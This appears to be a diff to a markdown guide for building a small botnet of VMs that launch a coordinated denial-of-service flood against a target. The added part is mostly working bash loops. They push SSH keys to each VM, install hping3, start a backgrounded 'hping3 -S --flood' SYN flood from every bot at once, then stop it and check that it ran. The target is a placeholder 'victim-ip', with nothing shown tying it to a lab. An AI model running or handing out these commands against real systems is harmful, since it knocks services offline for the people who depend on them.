@@ -67,10 +67,80 @@ for ip in $(cat vms.txt); do
 done
 ```
 
-8. **Optional: Monitor attack from control VM by pinging target:**
+8. **Optional: Handling Different Usernames per VM**
+
+If the VMs use different usernames, listing only IP addresses in `vms.txt` is insufficient. Instead, each entry should include the username and IP address in the format:
+
+```
+user1@vm1-ip
+user2@vm2-ip
+user3@vm3-ip
+user4@vm4-ip
+user5@vm5-ip
+user6@vm6-ip
+```
+
+This approach explicitly specifies the SSH login for each VM.
+
+---
+
+### Updated commands using `user@ip` entries in `vms.txt`
+
+**Copy SSH keys to all VMs:**
 
 ```bash
-ping -c 5 victim-ip
+while read -r user_host; do
+  ssh-copy-id "$user_host"
+done < vms.txt
 ```
+
+---
+
+**Install hping3 on all VMs:**
+
+```bash
+while read -r user_host; do
+  ssh "$user_host" 'sudo apt-get update && sudo apt-get install -y hping3'
+done < vms.txt
+```
+
+---
+
+**Run simultaneous DoS attack from all bots:**
+
+```bash
+target_ip="victim-ip"
+while read -r user_host; do
+  ssh "$user_host" "nohup sudo hping3 -S --flood $target_ip > /dev/null 2>&1 &"
+done < vms.txt
+```
+
+---
+
+**Stop all attacks:**
+
+```bash
+while read -r user_host; do
+  ssh "$user_host" "sudo pkill hping3"
+done < vms.txt
+```
+
+---
+
+**Check if hping3 is running on bots:**
+
+```bash
+while read -r user_host; do
+  ssh "$user_host" "pgrep hping3 && echo 'Running on $user_host' || echo 'Not running on $user_host'"
+done < vms.txt
+```
+
+---
+
+### Notes
+
+* Using `while read -r` ensures each line is read correctly, even if usernames or IP addresses contain special characters.
+* Including usernames with IP addresses enables management of VMs with different login accounts without modifying the scripts.
+* Ensure SSH keys are properly copied for each `user@ip` entry to enable passwordless access.
 
 ---
